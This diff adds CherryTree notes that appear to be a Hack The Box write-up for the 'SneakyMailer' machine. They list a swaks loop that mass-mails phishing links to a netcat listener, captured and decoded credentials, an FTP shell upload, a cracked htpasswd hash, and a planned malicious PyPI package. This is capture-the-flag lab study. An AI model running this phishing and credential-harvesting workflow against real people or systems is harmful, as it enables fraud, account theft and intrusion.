@@ -1,0 +1,38 @@
+<?xml version="1.0" ?>
+<cherrytree>
+	<node custom_icon_id="0" foreground="" is_bold="False" name="sneakymailer" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1595443523.68" ts_lastsave="1596138798.93" unique_id="1">
+		<rich_text>add sneakycorp.htb and dev.sneakycorp.htb to /etc/hosts file 
+
+bunch of emails on /teams.php
+
+try fishing attack on all of them, leading them to your http site (nc -lvp 4444)
+
+script: 
+while read email; do swaks --from test@sneakymailer.htb --to $email --
+server 10.10.10.197 --body &quot;</rich_text>
+		<rich_text link="webs http://10.10.15.81:4444&quot;">http://10.10.15.81:4444&quot;</rich_text>
+		<rich_text> --header &quot;Emergency&quot; ;done &lt; emails.txt
+
+nc recieves: 
+firstName=Paul&amp;lastName=Byrd&amp;email=paulbyrd%40sneakymailer.htb&amp;password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&amp;rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
+
+decoded into: paulbyrd@sneakymailer.htb : ^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht
+
+login to email with Thunderbird and get new user: 
+Developer: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C
+
+login to ftp 
+upload shell
+switch to developer user with creds
+
+found in /var/www/pypi.sneakycorp.htb/.htpasswd
+pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/
+soufianeelhaoui
+
+upload custom pypi package.. </rich_text>
+		<rich_text link="webs https://www.linode.com/docs/applications/project-management/how-to-create-a-private-python-package-repository/">https://www.linode.com/docs/applications/project-management/how-to-create-a-private-python-package-repository/</rich_text>
+		<rich_text>
+
+</rich_text>
+	</node>
+</cherrytree>
